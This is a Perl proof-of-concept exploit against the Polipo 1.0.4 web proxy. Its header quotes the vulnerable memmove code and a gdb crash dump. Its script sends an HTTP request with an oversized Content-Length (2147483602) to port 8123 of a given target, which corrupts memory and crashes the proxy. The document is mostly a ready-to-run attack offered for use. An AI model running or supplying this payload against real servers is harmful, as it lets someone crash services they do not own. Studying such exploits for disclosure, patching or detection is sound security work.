#!/usr/bin/perl
# estranged.pl
# AKA
# Polipo 1.0.4 Remote Memory Corruption 0day PoC
#
# Jeremy Brown [0xjbrown41@gmail.com//jbrownsec.blogspot.com//krakowlabs.com] 12.07.2009
#
# *********************************************************************************************************
#
# Hzzp loves you Polipo!
#
# No use reporting this issue to Ubuntu Security unless you feel like waiting two weeks for them to sit on
# it, then UNFLAG security issue and call it a feature.
#
# I informally request that they apologize to the developers themselves x)
#
# polipo-20080907/client.c [1001-1009]:
#
#     if(connection->reqlen > connection->reqbegin) {
#         memmove(connection->reqbuf, connection->reqbuf + connection->reqbegin,
#                 connection->reqlen - connection->reqbegin);
#         connection->reqlen -= connection->reqbegin;
#         connection->reqbegin = 0;
#     } else {
#         connection->reqlen = 0;
#         connection->reqbegin = 0;
#     }
#
# 0.9.8 / 1.0.4 tested vulnerable
#
# Program received signal SIGSEGV, Segmentation fault.
# 0x40093486 in memmove () from /lib/libc.so.6
# (gdb) i r
# eax            0x80000000	-2147483648
# ecx            0x2	2
# edx            0x8000002c	-2147483604
# ebx            0x80775d8	134706648
# esp            0xbffff7f0	0xbffff7f0
# ebp            0xbffff7f8	0xbffff7f8
# esi            0x4017002d	1075249197
# edi            0xc017002d	-1072234451
# eip            0x40093486	0x40093486
# eflags         0x10686	67206
# cs             0x23	35
# ss             0x2b	43
# ds             0x2b	43
# es             0x2b	43
# fs             0x0	0
# gs             0x0	0
# (gdb) bt
#0  0x40093486 in memmove () from /lib/libc.so.6
#1  0x0805a594 in ?? ()
#2  0x40170000 in ?? ()
#3  0xc0170000 in ?? ()
#4  0x8000002e in ?? ()
#5  0x0804e744 in ?? ()
#6  0x08077548 in ?? ()
#7  0x08077550 in ?? ()
#8  0x00000001 in ?? ()
#9  0x0000000a in ?? ()
#10 0x00000001 in ?? ()
#11 0x080775d8 in ?? ()
#12 0xbffff908 in ?? ()
#13 0x0805a458 in ?? ()
#14 0x08077498 in ?? ()
#15 0x00000001 in ?? ()
#16 0x00000001 in ?? ()
#17 0x00000001 in ?? ()
#18 0x00000001 in ?? ()
#19 0x0805eb8d in ?? ()
#20 0x00000000 in ?? ()
#21 0xbffff8d0 in ?? ()
#22 0xbffff8ac in ?? ()
#23 0xbffff8b0 in ?? ()
#24 0x00000000 in ?? ()
#25 0x00000000 in ?? ()
#26 0x00000000 in ?? ()
#27 0x00000000 in ?? ()
#28 0x00000000 in ?? ()
#29 0x00000000 in ?? ()
#30 0x00000000 in ?? ()
#31 0x00000000 in ?? ()
#32 0xbffff8b4 in ?? ()
#33 0xbffff8c0 in ?? ()
#34 0x00000000 in ?? ()
#35 0x00000000 in ?? ()
#36 0xbffff8b8 in ?? ()
#37 0xbffff8bc in ?? ()
#38 0x40170003 in ?? ()
#39 0x0806f803 in _IO_stdin_used ()
#40 0x08077550 in ?? ()
#41 0x4008dc91 in mallopt () from /lib/libc.so.6
# Previous frame inner to this frame (corrupt stack?)
# (gdb)
#
#(gdb) x/i $eip
#0x40093486 <memmove+102>:	repz movsb %ds:(%esi),%es:(%edi)
#
# "And my hair cannot commit, to one popular genre of music"
#
# *********************************************************************************************************
# estranged.pl

use IO::Socket;

$target = $ARGV[0];
$port   = 8123;

$payload = "GET / HTTP/1.1\r\nContent-Length: 2147483602\r\n\r\n";

$sock = IO::Socket::INET->new(Proto=>'tcp', PeerHost=>$target, PeerPort=>$port) or die "Error: $target:$port\n";
$sock->send($payload);

close($sock);